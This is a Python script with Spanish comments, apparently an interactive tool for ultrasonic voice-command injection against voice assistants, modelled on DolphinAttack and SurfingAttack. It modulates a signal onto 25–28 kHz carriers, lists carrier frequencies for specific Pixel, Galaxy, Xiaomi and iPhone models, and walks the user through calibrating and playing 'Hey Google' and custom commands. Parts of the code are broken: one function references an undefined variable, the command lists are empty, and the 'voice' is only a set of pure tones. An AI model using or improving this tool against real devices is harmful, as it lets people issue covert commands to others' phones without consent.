#!/usr/bin/env python3
"""
Sistema de Ataque Ultrasónico para Asistentes Virtuales
Implementación híbrida de SurfingAttack y DolphinAttack
Rango de frecuencias: 20000-28300 Hz
"""

import numpy as np
import sounddevice as sd
import scipy.signal as signal
import time
import json
import os

class AssistantAttackV2:
    """Sistema de ataque ultrasónico mejorado a asistentes virtuales"""
    
    def __init__(self):
        """Inicializa el sistema de ataque ultrasónico optimizado para DolphinAttack"""
        # Configuración de audio optimizada
        self.sample_rate = 192000  # Hz (alta frecuencia para ultrasonido)
        self.amplitude = 0.8       # Amplitud optimizada para Google Assistant
        
        # Frecuencias optimizadas basadas en SurfingAttack
        self.carrier_freqs = [25500, 26000, 26500, 27000, 27700, 28200]  # Hz (rango óptimo según investigación)
        self.current_carrier = 27000  # Hz (frecuencia portadora inicial optimizada)
        
        # Información de dispositivos testeados (para referencia)
        self.tested_devices = {
            'google': {'Pixel': [28200, 'Android 10-13'], 'Pixel 2': [27000, 'Android 10-13'], 'Pixel 3': [27000, 'Android 10-13']},
            'samsung': {'Galaxy S7': [25800, 'Android 8-13'], 'Galaxy S9': [26500, 'Android 9-13']},
            'xiaomi': {
                'Mi 5': [28300, 'Android 8-10'],
                'Mi 8': [25600, 'Android 9-12'],
                'Mi 8 Lite': [25500, 'Android 9-11'],
                'Redmi Note 10 Pro': [27700, 'Android 11-13']  # Optimizado para MIUI y Android 13
            },
            'huawei': {'Honor View 10': [27700, 'Android 8-10']},
            'apple': {'iPhone 5': [26200, 'iOS 10-12'], 'iPhone 5s': [26200, 'iOS 11-12'], 'iPhone 6+': [26000, 'iOS 11-12'], 'iPhone X': [26000, 'iOS 11-16']}
        }
        
        # Comentarios importantes:
        # - Las pruebas actuales están optimizadas para ultrasonidos emitidos desde una laptop
        # - Para mejores resultados, se recomienda:
        #   * Usar una superficie sólida (madera, metal, vidrio)
        #   * Mantener el dispositivo cerca del emisor de sonido
        #   * Evitar obstáculos entre el emisor y el dispositivo
        # - Próximas mejoras incluirán soporte para transductores PZT dedicados
        
        # Parámetros de modulación optimizados
        self.modulation_depth = 0.3  # Profundidad de modulación
        self.attack_duration = 0.05  # Duración del ataque (50ms)
        self.word_gap = 0.02        # Espacio entre palabras (20ms)
        
        # Lista de asistentes soportados
        self.commands = {
            'google': {},
            'siri': {},
            'alexa': {}
        }
        
        print("[INFO] Sistema de ataque ultrasónico inicializado")
        print("[INFO] Rango de frecuencias: 20000-28300 Hz")
    
    def create_voice_signal(self, text, duration=2.0):
        """Crea una señal de voz optimizada para DolphinAttack"""
        print(f"[INFO] Generando voz para: '{text}'")
        
        # Frecuencias optimizadas para Google Assistant
        base_freq = 220  # Hz - Frecuencia fundamental optimizada
        t = np.linspace(0, duration, int(self.sample_rate * duration))
        
        # Crear señal de voz con componentes específicos para 'Hey Google'
        voice_signal = np.zeros_like(t)
        
        # Componente fundamental más fuerte
        voice_signal += 0.5 * np.sin(2 * np.pi * base_freq * t)
        
        # Armónicos optimizados para reconocimiento de voz
        harmonics = [
            (2, 0.25),  # 440 Hz - 'Hey'
            (3, 0.20),  # 660 Hz - 'Goo'
            (4, 0.15),  # 880 Hz - 'gle'
            (5, 0.10)   # Armónico adicional para claridad
        ]
        
        for harmonic, amp in harmonics:
            voice_signal += amp * np.sin(2 * np.pi * base_freq * harmonic * t)
        
        # Ruido controlado para mejor reconocimiento
        noise = np.random.normal(0, 0.01, len(t))
        voice_signal += noise
        
        # Envolvente optimizada para comando de activación
        envelope = np.ones_like(t)
        
        # Tiempos optimizados según investigación DolphinAttack
        attack_time = self.attack_duration
        word_gap = self.word_gap
        decay_time = 0.08  # 80ms para final suave
        
        # Calcular muestras
        attack_samples = int(attack_time * self.sample_rate)
        word_samples = int(word_gap * self.sample_rate)
        decay_samples = int(decay_time * self.sample_rate)
        
        # Aplicar envolvente optimizada
        envelope[:attack_samples] = np.linspace(0, 1, attack_samples)**2  # Inicio cuadrático más suave
        envelope[-decay_samples:] = np.linspace(1, 0, decay_samples)**0.5  # Decaimiento más gradual
        
        # Añadir pausas entre palabras para mejor reconocimiento
        if 'Hey Google' in text:
            mid_point = len(t) // 2
            envelope[mid_point:mid_point + word_samples] *= 0.2  # Reducción entre 'Hey' y 'Google'
        
        voice_signal *= envelope
        
        return voice_signal
    
    def create_ultrasonic_modulation(self, voice_signal, carrier_freq=None):
        """Crea modulación ultrasónica optimizada para micrófonos MEMS modernos"""
        if carrier_freq is None:
            carrier_freq = self.current_carrier
            
        # Verificar rango de frecuencia portadora
        if carrier_freq < 25500 or carrier_freq > 28300:
            print(f"[ADVERTENCIA] Frecuencia {carrier_freq} Hz fuera del rango óptimo (25.5-28.3 kHz)")
        
        t = np.linspace(0, len(voice_signal) / self.sample_rate, len(voice_signal))
        
        # Normalizar señal de voz
        voice_signal = voice_signal / np.max(np.abs(voice_signal))
        
        # Generar señal portadora usando coseno para mejor demodulación
        carrier = np.cos(2 * np.pi * carrier_freq * t)
        
        # Aplicar modulación AM optimizada para MEMS modernos
        modulation_depth = 0.9  # Profundidad aumentada para mejor detección
        modulated_signal = (1 + modulation_depth * voice_signal) * carrier * self.amplitude
        
        # Aplicar ventana Tukey optimizada (r=0.3 para mejor balance)
        tukey_window = signal.windows.tukey(len(t), alpha=0.3)
        modulated_signal *= tukey_window
        
        # Sistema de filtrado optimizado para MEMS modernos
        nyquist = self.sample_rate / 2
        
        # Filtro paso alto mejorado (25 kHz)
        cutoff_freq = 25000  # Hz
        normalized_cutoff = cutoff_freq / nyquist
        b, a = signal.butter(6, normalized_cutoff, btype='high')
        filtered_signal = signal.filtfilt(b, a, modulated_signal)
        
        # Filtro paso banda más preciso (±750 Hz alrededor de la portadora)
        bandwidth = 1500  # Hz
        low_cut = (carrier_freq - bandwidth/2) / nyquist
        high_cut = (carrier_freq + bandwidth/2) / nyquist
        b, a = signal.butter(6, [low_cut, high_cut], btype='band')
        filtered_signal = signal.filtfilt(b, a, filtered_signal)
        
        # Filtro adicional para eliminar armónicos no deseados
        harmonic_cutoff = (carrier_freq + 2000) / nyquist  # Eliminar armónicos superiores
        b, a = signal.butter(4, harmonic_cutoff, btype='low')
        filtered_signal = signal.filtfilt(b, a, filtered_signal)
        
        # Normalizar y ajustar amplitud final
        filtered_signal = filtered_signal / np.max(np.abs(filtered_signal)) * self.amplitude
        
        return filtered_signal
    
    def test_hardware_capabilities(self):
        """Prueba las capacidades del hardware para SurfingAttack"""
        print("\n[TEST] Verificando capacidades del hardware para SurfingAttack...")
        
        # Verificar frecuencia de muestreo para calidad óptima
        print(f"[INFO] Frecuencia de muestreo actual: {self.sample_rate} Hz")
        optimal_sample_rate = 192000  # Hz (óptimo para ultrasonido)
        min_sample_rate = 96000      # Hz (mínimo recomendado)
        
        if self.sample_rate >= optimal_sample_rate:
            print("[EXCELENTE] Frecuencia de muestreo óptima para ultrasonido")
        elif self.sample_rate >= min_sample_rate:
            print("[OK] Frecuencia de muestreo adecuada para SurfingAttack")
            print(f"[SUGERENCIA] Considera aumentar a {optimal_sample_rate} Hz para mejor calidad")
        else:
            print(f"[ERROR] Frecuencia de muestreo insuficiente. Mínimo recomendado: {min_sample_rate} Hz")
            print(f"[SUGERENCIA] Aumentar sample_rate a {optimal_sample_rate} Hz para calidad óptima")
        
        # Verificar dispositivos de audio
        try:
            import sounddevice as sd
            devices = sd.query_devices()
            print("\n[INFO] Analizando dispositivos de audio...")
            
            # Buscar dispositivos compatibles con alta frecuencia
            compatible_output = False
            compatible_input = False
            
            for device in devices:
                if device['max_output_channels'] > 0:
                    if device['default_samplerate'] >= min_sample_rate:
                        compatible_output = True
                        print(f"[OK] Dispositivo de salida compatible encontrado: {device['name']}")
                        print(f"     Sample rate máximo: {device['default_samplerate']} Hz")
                if device['max_input_channels'] > 0:
                    if device['default_samplerate'] >= min_sample_rate:
                        compatible_input = True
                        print(f"[OK] Dispositivo de entrada compatible encontrado: {device['name']}")
                        print(f"     Sample rate máximo: {device['default_samplerate']} Hz")
            
            if not compatible_output:
                print("[ADVERTENCIA] No se encontraron dispositivos de salida compatibles")
            if not compatible_input:
                print("[ADVERTENCIA] No se encontraron dispositivos de entrada compatibles")
                
        except Exception as e:
            print(f"[ERROR] No se pudieron enumerar dispositivos: {e}")
        
        # Verificar rango de frecuencias soportado
        print("\n[INFO] Rango de frecuencias para SurfingAttack:")
        print(f"- Mínima: {min(self.carrier_freqs)} Hz")
        print(f"- Máxima: {max(self.carrier_freqs)} Hz")
        print(f"- Frecuencia portadora actual: {self.current_carrier} Hz")
        
        print("\n[INFO] Prueba de hardware completada")
    
    def text_to_speech_attack(self, text, assistant='google', duration=2.0, carrier_freq=None):
        """Genera un ataque de texto a voz"""
        # Verificar asistente
        if assistant not in self.commands:
            print(f"[ERROR] Asistente '{assistant}' no soportado. Usa 'google', 'siri' o 'alexa'.")
            return None
        
        # Verificar frecuencia
        if carrier_freq and (carrier_freq < 20000 or carrier_freq > 28300):
            print(f"[ERROR] Frecuencia {carrier_freq} Hz fuera del rango seguro (20000-28300 Hz)")
            return None
            
        # Generar señal de voz
        voice_signal = self.create_voice_signal(text, duration)
        
        # Aplicar modulación ultrasónica
        attack_signal = self.create_ultrasonic_modulation(voice_signal, carrier_freq)
        
        return attack_signal
    
    def play_attack(self, audio_signal, description="", safety_checks=True, save_wav=False):
        """Reproduce el ataque con verificaciones de seguridad y opción de guardar WAV"""
        if audio_signal is None:
            print("[ERROR] Señal de audio no válida")
            return
        
        try:
            import sounddevice as sd
            import time
            from tqdm import tqdm
            from scipy.io import wavfile
            
            # Verificaciones de seguridad
            if safety_checks:
                # Verificar niveles de amplitud
                max_amplitude = np.max(np.abs(audio_signal))
                if max_amplitude > 0.95:
                    print("[ADVERTENCIA] Amplitud muy alta, reduciendo para evitar distorsión")
                    audio_signal = audio_signal * (0.95 / max_amplitude)
                
                # Verificar frecuencias dominantes
                if len(audio_signal) > 1024:
                    from scipy import signal as sg
                    f, t, Sxx = sg.spectrogram(audio_signal, self.sample_rate)
                    dominant_freqs = f[np.argmax(Sxx, axis=0)]
                    if np.any(dominant_freqs < 20000):
                        print("[ADVERTENCIA] Detectadas frecuencias audibles significativas")
            
            # Mostrar información del ataque
            print(f"\n[ATTACK] Preparando ataque ultrasónico")
            print(f"[INFO] Descripción: {description}")
            print(f"[INFO] Duración: {len(audio_signal)/self.sample_rate:.2f} segundos")
            print(f"[INFO] Frecuencia de muestreo: {self.sample_rate} Hz")
            
            # Guardar en WAV si se solicita
            if save_wav:
                filename = f"ataque_ultrasonico_{int(time.time())}.wav"
                # Convertir a int16 para compatibilidad
                audio_int16 = np.int16(audio_signal * 32767)
                wavfile.write(filename, self.sample_rate, audio_int16)
                print(f"[INFO] Audio guardado como: {filename}")
            
            # Preguntar si reproducir
            respuesta = input("\n¿Deseas reproducir el ataque ahora? (s/n): ").strip().lower()
            if respuesta != 's':
                print("[INFO] Reproducción cancelada")
                return
            
            # Reproducir con barra de progreso
            duration = len(audio_signal) / self.sample_rate
            sd.play(audio_signal, self.sample_rate)
            
            with tqdm(total=100, desc="[PROGRESS] Reproduciendo", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
                start_time = time.time()
                while sd.get_stream().active:
                    current_time = time.time() - start_time
                    progress = min(int((current_time / duration) * 100), 100)
                    pbar.n = progress
                    pbar.refresh()
                    time.sleep(0.1)
            
            print("[INFO] Ataque completado exitosamente")
            
        except Exception as e:
            print(f"[ERROR] Error al reproducir: {e}")
    
    def get_optimal_frequency(self, device_brand, device_model=None):
        """Obtiene la frecuencia óptima para un dispositivo específico basado en SurfingAttack"""
        if device_brand.lower() not in self.tested_devices:
            print(f"[ADVERTENCIA] Marca '{device_brand}' no encontrada en la base de datos")
            return self.current_carrier
        
        if device_model is None:
            # Retornar la frecuencia promedio para la marca
            freqs = [data[0] for model_data in self.tested_devices[device_brand.lower()].values()]
            return sum(freqs) / len(freqs)
        
        # Buscar el modelo específico
        device_data = self.tested_devices[device_brand.lower()]
        if device_model in device_data:
            freq, os_info = device_data[device_model]
            print(f"[INFO] Sistema operativo compatible: {os_info}")
            return freq
        
        print(f"[ADVERTENCIA] Modelo '{device_model}' no encontrado para {device_brand}")
        return self.current_carrier

    def calibrate_hey_google(self, device_brand=None, device_model=None):
        """Calibra y prueba el ataque 'Hey Google' con diferentes parámetros"""
        print("\n[CALIBRACIÓN] Optimizando ataque 'Hey Google'")
        print("=" * 50)
        
        # Obtener frecuencia óptima si se especifica el dispositivo
        if device_brand:
            optimal_freq = self.get_optimal_frequency(device_brand, device_model)
            print(f"\n[INFO] Frecuencia óptima para {device_brand} {device_model or ''}: {optimal_freq} Hz")
            self.current_carrier = optimal_freq
            test_freqs = [optimal_freq - 200, optimal_freq, optimal_freq + 200]
        else:
            test_freqs = self.carrier_freqs
        
        # Parámetros a probar
        test_amplitudes = [0.7, 0.8, 0.9]
        test_durations = [1.5, 2.0, 2.5]
        
        print("\n[INFO] Iniciando calibración automática...")
        print("[INFO] Esto puede tomar unos minutos")
        
        for carrier_freq in test_freqs:
            print(f"\n[TEST] Frecuencia portadora: {carrier_freq} Hz")
            
            for amplitude in test_amplitudes:
                for duration in test_durations:
                    print(f"\n[CONFIG] Amplitud: {amplitude}, Duración: {duration}s")
                    
                    # Guardar configuración original
                    original_amplitude = self.amplitude
                    self.amplitude = amplitude
                    
                    # Generar y reproducir ataque
                    attack_signal = self.text_to_speech_attack(
                        "Hey Google",
                        assistant='google',
                        duration=duration,
                        carrier_freq=carrier_freq
                    )
                    
                    # Preguntar al usuario
                    response = input("¿Reproducir este ataque? (s/n): ").strip().lower()
                    if response == 's':
                        self.play_attack(attack_signal, 
                            f"Freq: {carrier_freq}Hz, Amp: {amplitude}, Dur: {duration}s")
                        
                        # Evaluar efectividad
                        effectiveness = input("¿El asistente respondió? (0-5, 0=no respuesta, 5=respuesta perfecta): ")
                        print(f"[RESULTADO] Efectividad: {effectiveness}/5")
                    
                    # Restaurar configuración
                    self.amplitude = original_amplitude
        
        print("\n[INFO] Calibración completada")
    
    def test_assistant_commands(self, assistant='google'):
        """Prueba comandos con diferentes frecuencias"""
        if assistant not in self.commands:
            print(f"[ERROR] Asistente '{assistant}' no soportado")
            return
        
        print(f"\n[TEST] Probando comandos para {assistant.upper()}")
        print("=" * 50)
        
        # Probar con diferentes frecuencias
        for carrier_freq in self.carrier_freqs:
            print(f"\n[FREQ] Probando con frecuencia portadora: {carrier_freq} Hz")
            
            for command_name, command_text in list(self.commands[assistant].items())[:3]:  # Solo primeros 3
                print(f"\n[TEST] Comando: {command_name}")
                print(f"[TEST] Texto: '{command_text}'")
                
                # Crear ataque
                attack_audio = self.text_to_speech_attack(command_text, assistant, duration=1.5, carrier_freq=carrier_freq)
                
                # Preguntar si reproducir
                response = input(f"¿Reproducir ataque '{command_name}' con {carrier_freq} Hz? (s/n): ").strip().lower()
                if response == 's':
                    self.play_attack(attack_audio, f"Comando: {command_name} @ {carrier_freq} Hz")
                else:
                    print("[SKIP] Saltando comando")
                
                # Preguntar si continuar con esta frecuencia
                continue_freq = input(f"¿Continuar con {carrier_freq} Hz? (s/n): ").strip().lower()
                if continue_freq != 's':
                    break
    
    def interactive_mode(self):
        """Modo interactivo mejorado"""
        print("\n" + "="*60)
        print("ASSISTANT ATTACK V2 - MODO INTERACTIVO")
        print("="*60)
        
        while True:
            print("\nOpciones:")
            print("[1] Calibrar hardware")
            print("[2] Enviar comando")
            print("[3] Probar frecuencias del SurfingAttack")
            print("[4] Salir")
            
            choice = input("\nSelecciona una opción: ").strip()
            
            if choice == "1":
                self.test_hardware_capabilities()
            elif choice == "2":
                text = input("Ingresa el comando a enviar: ").strip()
                if text:
                    assistant = input("Selecciona el asistente (siri/alexa/google): ").strip().lower()
                    freq = input("Ingresa la frecuencia portadora (20000-28000 Hz): ").strip()
                    carrier_freq = int(freq) if freq.isdigit() else None
                    
                    if assistant in self.commands:
                        # Preguntar duración
                        duracion = input("Ingresa la duración del comando (1-3 segundos): ").strip()
                        duracion = float(duracion) if duracion.replace('.','',1).isdigit() else 2.0
                        duracion = max(1.0, min(3.0, duracion))  # Limitar entre 1 y 3 segundos
                        
                        # Generar el ataque
                        attack_audio = self.text_to_speech_attack(text, assistant, duration=duracion, carrier_freq=carrier_freq)
                        
                        # Preguntar si guardar WAV
                        guardar = input("¿Deseas guardar el audio en formato WAV? (s/n): ").strip().lower() == 's'
                        
                        # Reproducir y/o guardar
                        self.play_attack(attack_audio, 
                                       f"Comando: {text} ({duracion:.1f}s @ {carrier_freq}Hz)",
                                       save_wav=guardar)
                    else:
                        print("[ERROR] Asistente no válido")
            elif choice == "3":
                self.test_surfingattack_frequencies()
            elif choice == "4":
                break
            else:
                print("[ERROR] Opción inválida")
    
    def test_surfingattack_frequencies(self):
        """Prueba las frecuencias específicas del SurfingAttack para diferentes dispositivos"""
        print("\n[TEST] Probando frecuencias del SurfingAttack...")
        print("=" * 60)
        
        # NOTAS IMPORTANTES:
        # 1. CONFIGURACIÓN ACTUAL:
        #    - Sistema optimizado para pruebas desde laptops
        #    - Frecuencias ajustadas para MEMS modernos (25.8-28.2 kHz)
        #    - Profundidad de modulación: 0.9 para mejor detección
        #
        # 2. DESARROLLO FUTURO:
        #    - Implementar soporte para transductor PZT
        #    - Optimizar transmisión en superficies sólidas
        #    - Mejorar detección de "Hey Google" en dispositivos modernos
        #
        # 3. RECOMENDACIONES:
        #    - Usar superficies planas y rígidas
        #    - Mantener el dispositivo cerca de la superficie
        #    - Ajustar volumen del dispositivo objetivo
        
        print("\nDispositivos compatibles y sus configuraciones:")
        print("-" * 80)
        print("| DISPOSITIVO          | FRECUENCIA | SISTEMA OPERATIVO COMPATIBLE |")
        print("-" * 80)
        
        for brand, models in self.tested_devices.items():
            for model, data in models.items():
                device_name = f"{brand.capitalize()} {model}"
                freq = data[0]
                os_info = data[1]
                print(f"| {device_name:<19} | {freq:^9} Hz | {os_info:<25} |")
        print("-" * 80)
        
        print("\n¿Quieres probar alguna frecuencia específica?")
        choice = input("Dispositivo específico o 'todos' para probar rango completo: ").strip()
        
        if choice.lower() == 'todos':
            # Probar rango completo
            test_freqs = sorted(set(devices.values()))
            for freq in test_freqs:
                print(f"\n[TEST] Probando {freq} Hz...")
                self.test_frequency(freq)
        elif choice in devices:
            # Probar dispositivo específico
            freq = devices[choice]
            print(f"\n[TEST] Probando {choice} ({freq} Hz)...")
            self.test_frequency(freq)
        else:
            print("[ERROR] Dispositivo no encontrado")
    
    def test_frequency(self, freq):
        """Prueba una frecuencia específica"""
        test_duration = 1.0
        
        # Generar tono de prueba
        t = np.linspace(0, test_duration, int(self.sample_rate * test_duration))
        test_tone = 0.5 * np.sin(2 * np.pi * freq * t)
        
        # Aplicar envolvente suave
        envelope = np.ones_like(t)
        fade_samples = int(0.1 * self.sample_rate)
        envelope[:fade_samples] = np.linspace(0, 1, fade_samples)
        envelope[-fade_samples:] = np.linspace(1, 0, fade_samples)
        test_tone *= envelope
        
        response = input(f"¿Reproducir tono de {freq} Hz? (s/n): ").strip().lower()
        if response == 's':
            print(f"[PLAYING] Tono de {freq} Hz...")
            sd.play(test_tone, self.sample_rate)
            sd.wait()
            print("[DONE]")
        else:
            print("[SKIP]")

def main():
    """Función principal"""
    print("\n" + "="*60)
    print("SISTEMA DE ATAQUE ULTRASÓNICO PARA ASISTENTES VIRTUALES")
    print("Basado en SurfingAttack y DolphinAttack")
    print("="*60)
    
    attack = AssistantAttackV2()
    attack.interactive_mode()

if __name__ == "__main__":
    main()
